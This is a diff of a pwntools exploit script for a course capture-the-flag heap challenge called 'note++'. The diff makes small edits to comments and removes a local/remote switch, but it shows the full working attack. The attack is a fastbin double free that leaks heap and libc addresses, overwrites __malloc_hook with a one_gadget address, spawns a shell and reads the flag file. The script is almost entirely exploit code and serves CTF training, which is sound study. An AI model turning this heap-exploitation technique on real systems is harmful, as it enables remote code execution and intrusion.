@@ -1,8 +1,8 @@
-_loc = False
-
+'/ Somewhat patched version /'
 from pwn import *
 context(arch = 'amd64', os = 'linux')
-r = process('./note++') if _loc else remote('edu-ctf.csie.org', 10181)
+r = remote('edu-ctf.csie.org', 10181)
+#r = process('./note++')
 def add( size, overflow, word ):
 	r.sendafter('> ','1')
 	r.sendafter('Size: ', str(size))
@@ -35,17 +35,17 @@ add(0x10, True, '1')
 heap = get(2) - 0x140
 success( "heap: "+ hex(heap) )
 dlt(2)
-# fast[0x80]->2->3->2->4->NULL
-# fast[0x70]->7->6->NULL
+# fastbin[0x80]->2->3->2 (->4->NULL)
+# fastbin[0x70]->7->6->NULL
 
 dlt(0)
 dlt(1)
-add(0x70, False, p64(heap + 0xc0 + 0x10) )		#0
-add(0x70, True, flat(0, 0x81) )					#1
-add(0x70, True, '0')							#3
+add(0x70, False, p64(heap + 0xc0 + 0x10) )	#0
+add(0x70, True, flat(0, 0x81) )			#1
+add(0x70, True, '0')				#3
 add(0x70, True, b'\0'*0x60 + flat(0, 0x101) )	#5
 dlt(4)
-# free a chunck of size 0x100
+# free a made chunck of size 0x100
 dlt(3)
 add(0x70, True, '3')
 libc = get(4) - 0x3c4b78
@@ -54,7 +54,7 @@ success( "libc: "+ hex(libc) )
 malloc_hook = libc + 0x3c4b10
 one_gadget = libc + 0xf02a4
 dlt(6)
-# fast[0x70]->6->7->6->NULL
+# fastbin[0x70]->6->7->6 (->NULL)
 add(0x60, False, p64(malloc_hook -0x10 -3) )
 add(0x60, False, '.')
 add(0x60, False, '.')
@@ -63,3 +63,4 @@ add(0x60, False, b'\0\0\0' + p64(one_gadget) )
 dlt(4) # trigger double free
 r.sendline('cat /home/`whoami`/flag')
 r.interactive()
+
